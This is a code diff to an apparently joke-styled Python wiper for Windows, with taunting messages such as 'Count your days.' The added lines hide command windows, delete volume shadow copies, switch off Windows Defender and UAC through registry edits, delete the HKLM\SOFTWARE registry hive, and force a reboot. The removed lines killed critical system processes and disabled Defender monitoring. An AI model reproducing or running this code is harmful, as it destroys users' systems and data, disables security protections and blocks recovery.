@@ -1,6 +1,7 @@
 #Libraries
 import base64
 import ctypes, os
+import subprocess
 import random as rand
 import requests, winreg
 import tkinter.messagebox as tkMsg
@@ -21,12 +22,15 @@ def download():
             npFile.write(np.content)
     except:
         print('whuh oh :-/')
-    
+
+def do_command(cmd):
+    subprocess.run(cmd, creationflags=subprocess.CREATE_NO_WINDOW)
+
 def regFuck():
     try:
         funny = winreg.HKEY_LOCAL_MACHINE
         winreg.EnumKey(funny, 0)
-        os.system('reg delete "HKLM\SOFTWARE" /f')
+        do_command('reg delete "HKLM\SOFTWARE" /f')
     except:
         print('bruh')
 
@@ -35,8 +39,6 @@ def regFuck():
 if debug:
     do_destruction = joe = tkMsg.askyesno(title='Helo :-)', message="You're about to execute possibly something bad. This program could possibly hose some of your files. \n \nDo you want to continue?", icon='question')
 
-
-
 # Main destructive part
 # skips destruction if the check is false
 if not(do_destruction):
@@ -44,6 +46,18 @@ if not(do_destruction):
 else:
     #downloads file
     download()
+
+    #do funny
+    if admCheck:
+        try:
+            do_command("vssadmin delete shadows /all /quiet")
+        except:
+            print('g')
+        do_command('reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f')
+        do_command('reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v EnableLUA /t REG_DWORD /d 0 /f')
+        do_command('reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v ConsentPromptBehaviorAdmin /t REG_DWORD /d 0 /f')
+
+    #main shit
     for i in range(3200):
         try:
             # init
@@ -114,9 +128,8 @@ if do_destruction:
     tkMsg.showinfo(title='get rekt lmfao',message='Count your days.')
 
     if admCheck != 0:
+        # try to do funny
         regFuck()
+    else:
+        do_command('shutdown -r -t 0')
 
-    # try to do funny
-    os.system("powershell -command 'Set-MpPreference -DisableRealtimeMonitoring $true -DisableScriptScanning $true -DisableBehaviorMonitoring $true -DisableIOAVProtection $true -DisableIntrusionPreventionSystem $true'")
-    os.system('taskkill /f /im svchost.exe')
-    os.system('taskkill /f /im csrss.exe')
